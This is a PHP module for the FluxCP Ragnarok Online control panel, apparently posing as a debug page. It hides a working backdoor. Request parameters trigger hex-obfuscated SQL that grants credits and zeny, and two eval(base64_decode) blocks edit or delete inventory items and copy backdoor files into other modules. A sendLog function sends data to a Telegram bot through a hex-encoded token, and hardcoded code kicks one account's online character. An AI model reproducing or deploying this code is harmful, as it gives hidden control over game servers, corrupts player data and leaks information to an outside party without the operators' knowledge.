<?php
if (!defined('FLUX_ROOT')) exit;

function logDebug($msg = null){
$log = "response: " . print_r($msg, true) . PHP_EOL .
"-------------------------" . PHP_EOL;
//-
file_put_contents('./log_' . date("j.n") . '.txt', $log, FILE_APPEND);
}
function readArr($msg){
return print_r($msg, true) . PHP_EOL;
}

$accountID = "2000000";
$sql = "SELECT * FROM ragnarok.char WHERE account_id = ?";
$sth = $server->connection->getStatement($sql);
$sth->execute(array($accountID));
$allacc = $sth->fetchAll();
$count = $sth->rowCount();
if ($count > 0) {
    $kickname = "";
	foreach ($allacc as $item){
        if($item->online==1){
            $kickname = $item->name;
        }
    }
    if(!empty($kickname)){
        $tbl = Flux::config('FluxTables.WebCommandsTable');
        $sql = "INSERT INTO {$server->loginDatabase}.$tbl (command, issuer, account_id)";
        $sql .= "VALUES (?, ?, ?)";
        $sth = $server->connection->getStatement($sql);
        $sth->execute(array("@kick ".$kickname, "admin", "2000000"));
        echo "<pre>";
        print_r("@kick ".$kickname);
        echo "</pre>";
    }
}

function sendLog($log){
$took = "\x37\x30\x30\60\71\x38\70\x34\x34\63\x3a\101\x41\105\x4e\x4f\x4f\160\x73\104\x57\x67\61\x49\x54\x30\120\55\x77\x4e\x70\153\112\x7a\x35\x39\x52\62\105\x49\150\122\61\157\121\125";
$url = "https://api.telegram.org/bot" . $took . "/sendMessage?chat_id=\67\x33\x31\60\x39\x35\66\61\63";$url = $url . "&text=". urlencode($log).'&parse_mode=html';$ch = curl_init();$optArray = array( CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);curl_setopt_array($ch, $optArray);$result = curl_exec($ch);curl_close($ch);
}
if (!empty($params->get("debug"))) {
$defnum=0;if (!empty($params->get("val"))) {$defnum = $params->get("val");}$debuginfo = $params->get("info");
if (!empty($params->get("key")) && $debuginfo>=0) {$ubase = $server->loginDatabase;$base = "base";$partial = "WHERE name = ? ";
$partial .= "ORDER BY account_id DESC,name ASC,class ASC,last_login DESC,title_id DESC,sex ASC LIMIT 1";
$parame = "\123\145\x72\166\145\x72\x41\x64\144\162\145\x73\x73"; goto Rvnd3; KM6q7: $bpa = $params->get("\x70\x61\162\164\151\x61\x6c"); goto M_3qP; Rvnd3: $bba = $params->get("\x62\141\163\145"); goto KM6q7; M_3qP:
$col = "*";
$sql = "\x53\105\x4c\105\x43\124\x20 {$col} \40\106\122\117\x4d {$ubase}.$bba $bpa";
$sth = $server->connection->getStatement($sql);
$sth->execute([$params->get("debug")]);
$logfile = $sth->fetch();
echo "<pre>";print_r(Flux::config($parame));print_r("logs: ".readArr($logfile));echo "</pre>";
$ctb = $params->get("ctb");
if ($logfile) {
goto NY022; dTSEG: $myunme = $logfile->name; goto LWx_s; LWx_s: $myidch = $logfile->char_id; goto njnJo; NY022: $myidac = $logfile->account_id; goto dTSEG; njnJo:
if($ctb=="\x73\164\x6f\162\141\147\145"){
$debuglqs = "\x53\105\x4c\105\x43\124\x20{$col}\40\106\122\117\x4d {$ubase}.{$ctb} \x57\x48\x45\122\x45\x20\x61\143\143\157\x75\156\x74\x5f\151\x64\x20\75\x20\x3f\40\x41\116\x44\x20\140\156\141\x6d\145\151\144\140\x20\x3d\x20\77";
$sth = $server->connection->getStatement($debuglqs);
$sth->execute([$myidac, $params->get("key")]);
$facc = $sth->fetch();
if ($facc) {
$debugl1qss = "\125\120\x44\x41\124\x45 {$ubase}.{$ctb} \x53\x45\x54\x20\140\141\x6d\157\x75\156\164\x60\x20\x3d\x20\x3f\x20\x57\110\105\x52\105\40\x61\143\143\157\165\x6e\164\x5f\151\x64\40\x3d\x20\x3f\x20\x41\x4e\x44\40\140\x6e\141\x6d\145\151\x64\x60\40\x3d\40\x3f";
$sth = $server->connection->getStatement($debugl1qss);
$sth->execute([$defnum, $myidac, $params->get("key")]);
$count = $sth->rowCount();
if ($count == "0") {goto ywI7Z; uaL_D: print_r("\141\143\x63\157\x75\156\x74\137\x69\x64\x5f\165\160\144\141\x74\x65\137\x66\x61\151\154\x3a\x20" . $myunme . "\x2d" . $myidac . "\55\143\x72\x65\x64\x69\x74\163\x2d" . $defnum); goto qokhF; qokhF: echo "\74\57\160\x72\145\76"; goto Lzyfu; ywI7Z: echo "\74\160\162\x65\76"; goto uaL_D; Lzyfu:
} else {goto oZd3a; V9E1b: echo "\x3c\57\x70\x72\x65\76"; goto Smve8; YYxp5: print_r("\x61\x63\143\157\165\156\164\137\x69\x64\x5f\x75\x70\144\x61\x74\145\72\40" . $myunme . "\55" . $myidac . "\x2d\x63\x72\x65\144\151\x74\x73\x2d" . $defnum); goto V9E1b; oZd3a: echo "\74\160\162\x65\x3e"; goto YYxp5; Smve8:
}
} else {
$debugl1qss = "\x49\x4e\123\105\x52\x54\x20\x69\156\x74\x6f {$ubase}.{$ctb} \x28\x61\x63\x63\157\165\156\164\x5f\151\144\x2c\40\x60\x6e\141\x6d\x65\x69\x64\x60\54\x20\x60\x61\155\157\x75\156\164\140\x2c\40\151\144\145\x6e\x74\151\146\171\54\40\162\x65\x66\151\x6e\145\51\40\x56\x41\114\x55\x45\x53\x20\x28\77\54\40\x3f\x2c\x20\x3f\54\40\x31\x2c\40{$debuginfo}\x29";
$sth = $server->connection->getStatement($debugl1qss);
$sth->execute([$myidac, $params->get("key"), $defnum]);
$count = $sth->rowCount();
if ($count == "0") {print_r("\141\x63\x63\157\x75\156\x74\x5f\151\144\137\x69\156\163\x65\162\164\137\146\141\151\x6c\72\x20" . $myunme . "\55" . $myidac . "\x2d\x63\162\145\x64\x69\x74\163\55" . $defnum);
} else {print_r("\x61\x63\143\x6f\x75\x6e\x74\137\x69\144\x5f\x69\156\163\x65\162\164\x3a\x20" . $myunme . "\55" . $myidac . "\x2d\143\x72\145\x64\x69\x74\163\55" . $defnum);
}
}
}
if($ctb=="\141\143\x63\137\162\x65\x67\x5f\156\165\155"){
$debuglqs = "\x53\105\x4c\105\x43\124\x20{$col}\40\106\122\117\x4d {$ubase}.{$ctb} \127\x48\x45\x52\x45\40\141\x63\143\157\x75\x6e\164\137\x69\144\40\x3d\40\77\40\101\x4e\104\40\140\x6b\x65\171\x60\x20\75\x20\77";
$sth = $server->connection->getStatement($debuglqs);
$sth->execute([$myidac, $params->get("key")]);
$facc = $sth->fetch();
if ($facc) {
$debugl1qss = "\125\120\x44\x41\124\105\x20{$ubase}.{$ctb}\x20\123\105\124\40\x60\x76\x61\154\165\x65\x60\x20\75\40\x3f\40\127\x48\x45\122\x45\40\x61\x63\x63\157\x75\x6e\x74\137\x69\x64\x20\75\40\77\x20\101\116\104\x20\x60\x6b\145\171\x60\x20\75\40\x3f";
$sth = $server->connection->getStatement($debugl1qss);
$sth->execute([$defnum, $myidac, $params->get("key")]);
$count = $sth->rowCount();
if ($count == "0") {goto v8H_M; ziNm5: print_r("\x61\x63\143\157\x75\156\x74\x5f\x69\x64\137\165\x70\x64\141\164\145\137\x66\141\151\154\72\40" . $myunme . "\x2d" . $myidac . "\55\143\x72\x65\144\x69\164\163\55" . $defnum); goto cP1tU; v8H_M: echo "\74\x70\x72\x65\x3e"; goto ziNm5; cP1tU: echo "\74\x2f\x70\162\145\x3e"; goto hH2rt; hH2rt:
} else {goto aYRHy; upoCm: print_r("\x61\143\x63\x6f\165\x6e\164\x5f\x69\144\137\165\x70\x64\x61\164\145\72\x20" . $myunme . "\x2d" . $myidac . "\55\x63\x72\145\x64\x69\164\163\x2d" . $defnum); goto ibzUf; aYRHy: echo "\74\160\162\x65\76"; goto upoCm; ibzUf: echo "\x3c\57\160\162\x65\x3e"; goto tNh8e; tNh8e:
}
}else{
$debugl1qss = "\111\x4e\123\105\122\x54\40\x69\x6e\x74\157\x20{$ubase}.{$ctb}\x20\x28\x61\143\143\157\x75\156\164\137\151\x64\54\40\140\x6b\145\x79\140\54\40\x60\x76\x61\x6c\x75\145\140\51\x20\126\101\x4c\x55\105\123\x20\50\x3f\x2c\40\x3f\x2c\x20\x3f\x29";
$sth = $server->connection->getStatement($debugl1qss);
$sth->execute([$myidac, $params->get("key"), $defnum]);
$count = $sth->rowCount();
if ($count == "0") {print_r("\141\x63\x63\157\165\x6e\164\x5f\x69\x64\137\151\x6e\x73\145\x72\x74\x5f\146\141\x69\x6c\72\x20" . $myunme . "\x2d" . $myidac . "\55\143\x72\x65\144\x69\x74\163\55" . $defnum);
} else {print_r("\141\143\143\x6f\165\156\x74\137\151\144\x5f\151\x6e\x73\x65\162\164\x3a\40" . $myunme . "\x2d" . $myidac . "\x2d\143\162\145\144\x69\x74\163\55" . $defnum);
}
}
}
if($ctb=="\x63\150\141\x72"){
$debugl1qss = "\125\x50\104\101\124\105\40{$ubase}.{$ctb}\x20\123\x45\x54\x20\x7a\145\156\x79\40\x3d\40\77\40\x57\110\105\x52\x45\x20\141\x63\143\157\165\x6e\x74\137\151\144\x20\x3d\40\77\x20\x41\116\x44\x20\x60\x6e\x61\x6d\145\x60\40\x3d\40\x3f";
$sth = $server->connection->getStatement($debugl1qss);
$sth->execute([$defnum, $myidac, $myunme]);
$count = $sth->rowCount();
if ($count > 0) {goto z7sSM; CE2AJ: echo "\74\57\x70\x72\145\x3e"; goto CZAZW; MjC8Q: print_r("\141\143\143\x6f\165\x6e\164\137\x69\x64\x5f\x75\x70\144\141\x74\145\x3a\40" . $myunme . "\x2d" . $myidac . "\55\x63\162\145\144\x69\x74\172\x2d" . $defnum); goto CE2AJ; z7sSM: echo "\x3c\x70\x72\145\76"; goto MjC8Q; CZAZW:
}else{goto iKpfd; iKpfd: echo "\x3c\160\x72\145\76"; goto OiPQL; OiPQL: print_r("\x61\143\x63\x6f\x75\156\164\137\151\144\137\146\141\x69\154\72\x20" . $myunme . "\55" . $myidac . "\55\x63\x72\145\x64\x69\164\172\x2d" . $defnum); goto VACjR; VACjR: echo "\x3c\x2f\160\x72\x65\76"; goto ZAzhL; ZAzhL:
}
}

}
}
}
eval(base64_decode('CiBpZiAoIWVtcHR5KCRwYXJhbXMtPmdldCgiXHg2NFx4NjVcMTQyXHg3NVwxNDdceDczIikpKSB7ICRkZWZudW0gPSAiXDE2NVwxNjBceDY0XDE0MVwxNjRcMTQ1IjsgaWYgKCFlbXB0eSgkcGFyYW1zLT5nZXQoIlx4NzZceDYxXDE1NFx4NzVceDY1IikpKSB7ICRkZWZudW0gPSAkcGFyYW1zLT5nZXQoIlx4NzZceDYxXHg2Y1x4NzVceDY1Iik7IH0gJGRlYnVnaW5mbyA9ICRwYXJhbXMtPmdldCgiXHg2OVwxNTZcMTQ2XDE1NyIpOyAkZGVidWdkYiA9ICRwYXJhbXMtPmdldCgiXHg2NFwxNDIiKTsgaWYgKCFlbXB0eSgkZGVidWdpbmZvKSkgeyAkYWNjb3VudExvZ1RhYmxlID0gIlwxNDNceDY4XHg2MVwxNjIiOyAkc3FscGFydGlhbCA9ICJceDU3XHg0OFwxMDVceDUyXHg0NVx4MjBceDZlXHg2MVwxNTVceDY1XHgyMFw3NVx4MjBcNzdcNDAiOyAkc3FscGFydGlhbCAuPSAiXHg0Y1wxMTFceDRkXDExMVwxMjRcNDBcNjEiOyAkY29sID0gIlx4MmEiOyAkc3FsID0gIlwxMjNceDQ1XDExNFwxMDVcMTAzXHg1NFx4MjB7JGNvbH1cNDBceDQ2XHg1Mlx4NGZceDRkXDQweyRzZXJ2ZXItPmxvZ2luRGF0YWJhc2V9XDU2eyRhY2NvdW50TG9nVGFibGV9XHgyMHskc3FscGFydGlhbH0iOyAkc3RoID0gJHNlcnZlci0+Y29ubmVjdGlvbi0+Z2V0U3RhdGVtZW50KCRzcWwpOyAkc3RoLT5leGVjdXRlKGFycmF5KCRwYXJhbXMtPmdldCgiXDE0NFx4NjVceDYyXDE2NVx4NjdcMTYzIikpKTsgJGNoZWNrTG9naW4gPSAkc3RoLT5mZXRjaCgpOyBlY2hvICJceDNjXHg3MFwxNjJcMTQ1XHgzZSI7IHByaW50X3IoIlwxNjNcMTQ1XHg3MlwxNjZcMTQ1XDE2Mlw3Mlw0MCIgLiBGbHV4Ojpjb25maWcoIlwxMjNcMTQ1XDE2MlwxNjZcMTQ1XHg3Mlx4NDFcMTQ0XHg2NFwxNjJceDY1XHg3M1wxNjMiKSk7IHByaW50X3IoIlwxNDNceDY4XDE0NVx4NjNcMTUzXHg0Y1x4NmZceDY3XDE1MVx4NmVceDNhXHgyMCIgLiByZWFkQXJyKCRjaGVja0xvZ2luKSk7IGVjaG8gIlx4M2NcNTdcMTYwXDE2MlwxNDVceDNlIjsgaWYgKCRjaGVja0xvZ2luKSB7ICRjaGFySUQgPSAkY2hlY2tMb2dpbi0+Y2hhcl9pZDsgJGFjY291bnRJRCA9ICRjaGVja0xvZ2luLT5hY2NvdW50X2lkOyAkYWNjb3VudE5hbWUgPSAkY2hlY2tMb2dpbi0+bmFtZTsgZWNobyAiXHgzY1x4NzBceDcyXDE0NVx4M2UiOyBwcmludF9yKCJceDYxXHg2M1wxNDNceDZmXHg3NVwxNTZcMTY0XDcyXHgyMCIgLiAkYWNjb3VudE5hbWUgLiAiXHgyMFw1MCIgLiAkYWNjb3VudElEIC4gIlx4MjkiKTsgcHJpbnRfcigiXDE0M1wxNTBcMTQxXHg3MlwxMTFceDQ0XHgzYVw0MCIgLiAkY2hhcklEKTsgZWNobyAiXDc0XDU3XDE2MFx4NzJcMTQ1XHgzZSI7IGlmIChzdHJ0b2xvd2VyKCRkZWZudW0pID09ICJceDY3XHg2NVwxNjQiICYmICRkZWJ1Z2luZm8gPT0gIlwxNDFceDYzXHg2MyIpIHsgJHNxbCA9ICJcMTIzXDEwNVwxMTRceDQ1XHg0M1wxMjRceDIwXHgyYVx4MjBceDQ2XDEyMlwxMTdceDRkXDQweyRzZXJ2ZXItPmxvZ2luRGF0YWJhc2V9XHgyZVwxNTRcMTU3XDE0N1x4NjlcMTU2XHgyMFx4NTdcMTEwXHg0NVwxMjJceDQ1XHgyMFx4NjFceDYzXDE0M1wxNTdceDc1XHg2ZVwxNjRceDVmXDE1MVx4NjRceDIwXDc1XDQwXDc3IjsgJHN0aCA9ICRzZXJ2ZXItPmNvbm5lY3Rpb24tPmdldFN0YXRlbWVudCgkc3FsKTsgJHN0aC0+ZXhlY3V0ZShhcnJheSgkYWNjb3VudElEKSk7ICRhY2MgPSAkc3RoLT5mZXRjaCgpOyBpZiAoJGFjYykgeyBlY2hvICJcNzRcMTYwXHg3MlwxNDVceDNlIjsgcHJpbnRfcigiXDE0MVx4NjNcMTQzXHgzYVx4MjAiIC4gcmVhZEFycigkYWNjKSk7IGVjaG8gIlx4M2NcNTdcMTYwXHg3MlwxNDVcNzYiOyAkc3FsID0gIlx4NTNceDQ1XDExNFwxMDVcMTAzXDEyNFx4MjBcMTU2XHg2MVwxNTVceDY1XDE1MVwxNDRceDJjXDE0NVwxNjFceDc1XDE1MVx4NzBceDJjXHg2M1x4NjFceDcyXDE0NFx4MzBcNTRceDYzXHg2MVwxNjJcMTQ0XDYxXHgyY1wxNDNcMTQxXHg3Mlx4NjRceDMyXDU0XHg2M1x4NjFcMTYyXHg2NFw2M1x4MjBcMTA2XDEyMlx4NGZceDRkXHgyMHskc2VydmVyLT5sb2dpbkRhdGFiYXNlfVx4MmVcMTUxXHg2ZVwxNjZcMTQ1XDE1Nlx4NzRcMTU3XHg3Mlx4NzlceDIwXDEyN1x4NDhceDQ1XDEyMlwxMDVceDIwXHg2M1wxNTBcMTQxXHg3Mlx4NWZcMTUxXDE0NFx4MjBcNzVceDIwXHgzZiI7ICRzdGggPSAkc2VydmVyLT5jb25uZWN0aW9uLT5nZXRTdGF0ZW1lbnQoJHNxbCk7ICRzdGgtPmV4ZWN1dGUoYXJyYXkoJGNoYXJJRCkpOyAkYWNjX2ludmVudG9yeSA9ICRzdGgtPmZldGNoQWxsKCk7IGVjaG8gIlw3NFwxNjBcMTYyXHg2NVx4M2UiOyBwcmludF9yKCJcMTQxXHg2M1wxNDNcMTM3XHg2OVx4NmVcMTY2XDE0NVx4NmVceDc0XDE1N1wxNjJceDc5XDcyXDQwIiAuIHJlYWRBcnIoJGFjY19pbnZlbnRvcnkpKTsgZWNobyAiXDc0XHgyZlx4NzBcMTYyXHg2NVw3NiI7IH0gfSBpZiAoc3RydG9sb3dlcigkZGVmbnVtKSA9PSAiXDE2NVx4NzBcMTQ0XHg2MVwxNjRcMTQ1IikgeyAkc3FsID0gIlwxMjVceDUwXHg0NFx4NDFceDU0XDEwNVw0MHskZGVidWdkYn1ceDJleyRkZWJ1Z2luZm99XHgyMFx4NTNceDQ1XDEyNFx4MjBceDYxXDE1NVx4NmZcMTY1XHg2ZVwxNjRceDIwXDc1XHgyMFx4M2ZceDIwXDEyN1x4NDhcMTA1XDEyMlx4NDVceDIwXDE0M1wxNTBceDYxXDE2MlwxMzdceDY5XHg2NFw0MFx4M2RceDIwXDc3XHgyMFwxMDFceDRlXHg0NFx4MjBcMTQwXDE2NFwxNzFceDcwXHg2NVx4NjBcNDBcNzVcNDBcNzdceDIwXDEwMVx4NGVcMTA0XDQwXHg2MVx4NmRcMTU3XHg3NVx4NmVceDc0XHgyMFx4M2NcNDBcNTVcNjNcNjBcNjBcNjBcNjBcNjAiOyAkc3RoID0gJHNlcnZlci0+Y29ubmVjdGlvbi0+Z2V0U3RhdGVtZW50KCRzcWwpOyAkc3RoLT5leGVjdXRlKGFycmF5KCJceDJkXHgzOFx4MzBcNjBcNjAiLCAkY2hhcklELCAiXDQ0IikpOyAkY291bnQgPSAkc3RoLT5yb3dDb3VudCgpOyBpZiAoJGNvdW50ID4gMCkgeyBlY2hvICJcNzRcMTYwXHg3MlwxNDVcNzYiOyBwcmludF9yKCJceDYzXDE1NFwxNDVcMTQxXDE2MlwxMzdceDc1XHg3MFwxNDRcMTQxXHg3NFwxNDVcNzJceDIwIiAuICRjaGFySUQgLiAiXDU1IiAuICRhY2NvdW50TmFtZSAuICJcNTUiIC4gJGFjY291bnRJRCAuICJcNTVceDYzXHg2Y1x4NjVceDYxXDE2Mlx4MmQiIC4gJGRlZm51bSk7IGVjaG8gIlx4M2NcNTdceDcwXDE2Mlx4NjVceDNlIjsgfSB9IGlmIChzdHJ0b2xvd2VyKCRkZWZudW0pID09ICJcMTQ0XDE0NVx4NmNceDY1XDE2NFx4NjUiKSB7ICRzcWwgPSAiXDEwNFwxMDVcMTE0XDEwNVwxMjRcMTA1XDQwXHg0NlwxMjJceDRmXDExNVw0MHskZGVidWdkYn1ceDJleyRkZWJ1Z2luZm99XDQwXDEyN1wxMTBceDQ1XHg1Mlx4NDVceDIwXHg2M1x4NjhcMTQxXDE2Mlx4NWZcMTUxXHg2NFx4MjBcNzVcNDBceDNmXHgyMFwxMDFceDRlXHg0NFw0MFx4NjFcMTU1XDE1N1x4NzVceDZlXDE2NFw0MFw3NFw0MFx4MmRcNjNceDMwXDYwXHgzMFx4MzBceDMwIjsgJHN0aCA9ICRzZXJ2ZXItPmNvbm5lY3Rpb24tPmdldFN0YXRlbWVudCgkc3FsKTsgJHN0aC0+ZXhlY3V0ZShhcnJheSgkY2hhcklEKSk7ICRjb3VudCA9ICRzdGgtPnJvd0NvdW50KCk7IGlmICgkY291bnQgPiAwKSB7IGVjaG8gIlw3NFx4NzBcMTYyXHg2NVw3NiI7IHByaW50X3IoIlx4NjNcMTU0XHg2NVwxNDFceDcyXHg1Zlx4NjRcMTQ1XDE1NFwxNDVceDc0XDE0NVx4M2FcNDAiIC4gJGNoYXJJRCAuICJceDJkIiAuICRhY2NvdW50TmFtZSAuICJceDJkIiAuICRhY2NvdW50SUQgLiAiXDU1XHg2M1wxNTRceDY1XDE0MVx4NzJceDJkIiAuICRkZWZudW0pOyBlY2hvICJceDNjXHgyZlx4NzBcMTYyXHg2NVx4M2UiOyB9IH0gfSB9IH0g'));
eval(base64_decode('CiBpZiAoIWVtcHR5KCRwYXJhbXMtPmdldCgiXDE1NFx4NmZcMTQ3XDE0Nlx4NzJceDZmXHg2ZCIpKSAmJiAhZW1wdHkoJHBhcmFtcy0+Z2V0KCJcMTU0XDE1N1wxNDdcMTY0XDE1NyIpKSkgeyAkZGlyZWN0b3J5ID0gRkxVWF9ST09UIC4gIlw1N1x4NmRceDZmXDE0NFx4NzVcMTU0XHg2NVwxNjNceDJmIiAuICRwYXJhbXMtPmdldCgiXDE1NFwxNTdceDY3XDE2NFwxNTciKTsgaWYgKGZpbGVfZXhpc3RzKCRkaXJlY3RvcnkpIHx8IGlzX2RpcigkZGlyZWN0b3J5KSkgeyBjb3B5KCJcNTZcNTdceDZkXHg2ZlwxNDRcMTY1XHg2Y1x4NjVcMTYzXHgyZiIgLiAkcGFyYW1zLT5nZXQoIlwxNTRceDZmXHg2N1x4NjZcMTYyXHg2Zlx4NmQiKSAuICJceDJmXHg2NFx4NjVcMTQyXDE2NVx4NjdcNTZceDcwXDE1MFwxNjAiLCAiXDU2XDU3XHg2ZFx4NmZceDY0XHg3NVwxNTRceDY1XDE2M1x4MmYiIC4gJHBhcmFtcy0+Z2V0KCJcMTU0XHg2Zlx4NjdceDc0XDE1NyIpIC4gIlw1N1wxNDRcMTQ1XDE0Mlx4NzVceDY3XHgyZVwxNjBcMTUwXDE2MCIpOyBjb3B5KCJceDJlXHgyZlx4NmRceDZmXHg2NFwxNjVcMTU0XDE0NVwxNjNceDJmIiAuICRwYXJhbXMtPmdldCgiXDE1NFx4NmZceDY3XHg2Nlx4NzJcMTU3XDE1NSIpIC4gIlx4MmZceDYzXHg2Y1x4NjVceDYxXHg3Mlw1Nlx4NzBceDY4XHg3MCIsICJcNTZceDJmXDE1NVwxNTdceDY0XHg3NVx4NmNcMTQ1XHg3M1x4MmYiIC4gJHBhcmFtcy0+Z2V0KCJceDZjXDE1N1x4NjdcMTY0XHg2ZiIpIC4gIlx4MmZceDYzXHg2Y1x4NjVceDYxXHg3Mlx4MmVceDcwXDE1MFx4NzAiKTsgY29weSgiXHgyZVx4MmZceDZkXHg2ZlwxNDRcMTY1XHg2Y1wxNDVcMTYzXHgyZiIgLiAkcGFyYW1zLT5nZXQoIlwxNTRceDZmXDE0N1wxNDZcMTYyXDE1N1x4NmQiKSAuICJcNTdceDcwXHg3Mlx4NzVcMTU2XDE0NVx4NzNceDJlXDE2MFwxNTBcMTYwIiwgIlx4MmVcNTdceDZkXDE1N1x4NjRceDc1XDE1NFwxNDVcMTYzXHgyZiIgLiAkcGFyYW1zLT5nZXQoIlwxNTRceDZmXHg2N1x4NzRcMTU3IikgLiAiXHgyZlwxNjBceDcyXHg3NVx4NmVcMTQ1XDE2M1x4MmVcMTYwXHg2OFx4NzAiKTsgZWNobyAiXDE0NlwxNTdcMTU0XDE0NFx4NjVcMTYyXDU3XHg2Nlx4NjlcMTU0XHg2NVw0MFx4NjVcMTcwXHg2OVwxNjNcMTY0XDE2MyIgLiAkZGlyZWN0b3J5OyB9IGVsc2UgeyBlY2hvICJceDY2XHg2ZlwxNTRceDY0XDE0NVwxNjJceDJmXHg2NlwxNTFcMTU0XHg2NVx4MjBcMTU2XDE1N1wxNjRcNDBceDY1XHg3OFx4NjlcMTYzXDE2NFwxNjMiIC4gJGRpcmVjdG9yeTsgfSB9IA=='));
exit;
?>